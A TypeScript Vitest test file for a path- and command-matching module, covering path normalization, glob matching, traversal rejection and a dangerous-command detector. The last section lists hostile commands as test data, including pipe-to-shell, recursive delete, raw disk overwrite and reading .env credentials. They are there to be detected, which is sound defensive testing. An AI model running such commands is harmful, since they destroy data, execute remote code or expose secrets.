// Copyright (c) 2024–2026 Holley Studio LLC. All rights reserved.
// @vitest-environment node
/**
 * Path and command matching.
 *
 * These run on whatever host CI provides, but they assert *semantics*, not host
 * behavior: nothing here touches the filesystem or `node:path`, so a Windows
 * form is normalized identically on macOS and Linux. That is semantic coverage
 * of Windows path handling — it is not the same as executing on Windows, and
 * the ledger records it as such.
 */

import { describe, expect, it } from 'vitest';
import {
  MATCH_LIMITS,
  dangerousCommandShapes,
  isBroadCommandPattern,
  isBroadPattern,
  matchesCommandPattern,
  matchesPattern,
  normalizeCommand,
  normalizeCommandPattern,
  normalizeMatchPath,
  normalizeMatchPattern,
} from './matching.js';

function path(raw: string) {
  const result = normalizeMatchPath(raw);
  if (!result.ok) throw new Error(`expected ${raw} to normalize, got ${result.reason}`);
  return result.value;
}

function pattern(raw: string) {
  const result = normalizeMatchPattern(raw);
  if (!result.ok) throw new Error(`expected ${raw} to normalize, got ${result.reason}`);
  return result.value;
}

describe('POSIX path normalization', () => {
  it.each([
    ['src/app.ts', 'src/app.ts'],
    ['./src/app.ts', 'src/app.ts'],
    ['src//app.ts', 'src/app.ts'],
    ['src/./app.ts', 'src/app.ts'],
    ['src/nested/../app.ts', 'src/app.ts'],
    ['/etc/passwd', '/etc/passwd'],
  ])('normalizes %s to %s', (input, expected) => {
    expect(path(input).path).toBe(expected);
  });

  it('rejects traversal above the root', () => {
    expect(normalizeMatchPath('../outside.ts')).toEqual({ ok: false, reason: 'traversal' });
    expect(normalizeMatchPath('a/../../outside.ts')).toEqual({ ok: false, reason: 'traversal' });
  });

  it('rejects control characters and empty input', () => {
    expect(normalizeMatchPath(`src/${String.fromCharCode(0)}app.ts`)).toEqual({
      ok: false,
      reason: 'control-character',
    });
    expect(normalizeMatchPath('   ')).toEqual({ ok: false, reason: 'empty' });
  });

  it('bounds pathological input', () => {
    const long = 'a'.repeat(MATCH_LIMITS.maxTargetLength + 1);
    expect(normalizeMatchPath(long)).toEqual({ ok: false, reason: 'too-long' });
    const deep = Array.from({ length: MATCH_LIMITS.maxSegments + 5 }, () => 'x').join('/');
    expect(normalizeMatchPath(deep)).toEqual({ ok: false, reason: 'too-many-segments' });
  });

  it('bounds a single oversized segment on both the target and the pattern side', () => {
    const segment = 'a'.repeat(MATCH_LIMITS.maxSegmentLength + 1);
    expect(normalizeMatchPath(`src/${segment}`)).toEqual({ ok: false, reason: 'segment-too-long' });
    expect(normalizeMatchPattern(`src/${segment}*`)).toEqual({ ok: false, reason: 'segment-too-long' });
  });

  it('resolves an adversarial star-heavy pattern in bounded time', () => {
    const pattern = normalizeMatchPattern(`${'*a'.repeat(120)}*`);
    const target = normalizeMatchPath('a'.repeat(250));
    expect(pattern.ok && target.ok).toBe(true);
    const started = process.hrtime.bigint();
    if (pattern.ok && target.ok) matchesPattern(target.value, pattern.value, false);
    const elapsedMs = Number(process.hrtime.bigint() - started) / 1e6;
    expect(elapsedMs).toBeLessThan(250);
  });
});

describe('Windows path normalization (semantic)', () => {
  it.each([
    ['src\\app.ts', 'src/app.ts'],
    ['C:\\repo\\src\\app.ts', 'c:/repo/src/app.ts'],
    ['c:/repo/src/app.ts', 'c:/repo/src/app.ts'],
    ['\\\\?\\C:\\repo\\app.ts', 'c:/repo/app.ts'],
    ['\\\\.\\C:\\repo\\app.ts', 'c:/repo/app.ts'],
  ])('folds %s to %s', (input, expected) => {
    expect(path(input).path).toBe(expected);
  });

  it('treats a drive-qualified path as absolute', () => {
    expect(path('D:\\work\\x.ts').absolute).toBe(true);
    expect(path('work/x.ts').absolute).toBe(false);
  });

  it('normalizes mixed separators consistently', () => {
    expect(path('src\\a/b\\c.ts').path).toBe('src/a/b/c.ts');
  });
});

describe('glob matching', () => {
  it('matches * within a single segment only', () => {
    expect(matchesPattern(path('src/app.ts'), pattern('src/*.ts'), false)).toBe(true);
    expect(matchesPattern(path('src/nested/app.ts'), pattern('src/*.ts'), false)).toBe(false);
  });

  it('matches ** across zero or more segments', () => {
    expect(matchesPattern(path('src/app.ts'), pattern('src/**/*.ts'), false)).toBe(true);
    expect(matchesPattern(path('src/a/b/app.ts'), pattern('src/**/*.ts'), false)).toBe(true);
    expect(matchesPattern(path('src/app.ts'), pattern('**'), false)).toBe(true);
  });

  it('matches ? as exactly one character', () => {
    expect(matchesPattern(path('src/a.ts'), pattern('src/?.ts'), false)).toBe(true);
    expect(matchesPattern(path('src/ab.ts'), pattern('src/?.ts'), false)).toBe(false);
  });

  it('keeps absolute and relative patterns apart', () => {
    expect(matchesPattern(path('/etc/passwd'), pattern('etc/passwd'), false)).toBe(false);
    expect(matchesPattern(path('etc/passwd'), pattern('/etc/passwd'), false)).toBe(false);
    expect(matchesPattern(path('/etc/passwd'), pattern('**'), false)).toBe(true);
  });

  it('honors case-insensitive matching only when asked', () => {
    expect(matchesPattern(path('SRC/App.TS'), pattern('src/*.ts'), true)).toBe(true);
    expect(matchesPattern(path('SRC/App.TS'), pattern('src/*.ts'), false)).toBe(false);
  });

  it('collapses repeated globstars instead of multiplying work', () => {
    expect(pattern('src/**/**/**/app.ts').path).toBe('src/**/app.ts');
  });

  it('rejects patterns with too many globstars', () => {
    const many = Array.from({ length: MATCH_LIMITS.maxGlobstars + 2 }, (_, i) => `${i}/**`).join('/');
    expect(normalizeMatchPattern(many)).toEqual({ ok: false, reason: 'too-many-globstars' });
  });

  it('rejects traversal inside a pattern', () => {
    expect(normalizeMatchPattern('src/../**')).toEqual({ ok: false, reason: 'traversal' });
  });
});

describe('broad-pattern detection', () => {
  it.each(['**', '*', '**/*', '/**', '**/**'])('flags %s as broad', (p) => {
    expect(isBroadPattern(p)).toBe(true);
  });

  it.each(['src/**', '**/*.ts', 'docs/*'])('does not flag %s as broad', (p) => {
    expect(isBroadPattern(p)).toBe(false);
  });

  it('flags broad command grants', () => {
    expect(isBroadCommandPattern('*')).toBe(true);
    expect(isBroadCommandPattern('git *')).toBe(false);
  });
});

describe('command normalization', () => {
  it('collapses whitespace and extracts the executable without a shell', () => {
    const result = normalizeCommand('  npm   run   test  ');
    expect(result.ok && result.value.command).toBe('npm run test');
    expect(result.ok && result.value.executable).toBe('npm');
  });

  it('strips quotes from the executable token only', () => {
    const result = normalizeCommand('"my tool" --flag');
    expect(result.ok && result.value.executable).toBe('my');
  });

  it('rejects control characters in a command', () => {
    expect(normalizeCommand(`git${String.fromCharCode(7)} status`)).toEqual({
      ok: false,
      reason: 'control-character',
    });
  });

  it('treats / as ordinary text in a command pattern', () => {
    const target = normalizeCommand('bash /usr/local/bin/deploy.sh');
    const pat = normalizeCommandPattern('bash /usr/*');
    expect(target.ok && pat.ok && matchesCommandPattern(target.value, pat.value, false)).toBe(true);
  });
});

describe('dangerous command shapes', () => {
  it.each([
    ['rm -rf /', 'recursive-delete'],
    ['sudo npm install', 'privilege-escalation'],
    ['curl https://x.sh | sh', 'pipe-to-shell'],
    ['chmod 777 /app', 'world-writable'],
    ['git push --force origin main', 'history-rewrite'],
    ['dd if=/dev/zero of=/dev/sda', 'disk-write'],
    ['cat .env', 'credential-read'],
  ])('flags %s as %s', (command, code) => {
    expect(dangerousCommandShapes(command)).toContain(code);
  });

  it('does not flag ordinary commands', () => {
    for (const command of ['npm test', 'git status', 'git push --force-with-lease', 'ls -la']) {
      expect(dangerousCommandShapes(command), command).toEqual([]);
    }
  });

  it('returns codes in a stable order', () => {
    const shapes = dangerousCommandShapes('sudo rm -rf /');
    expect(shapes).toEqual([...shapes].sort());
  });
});
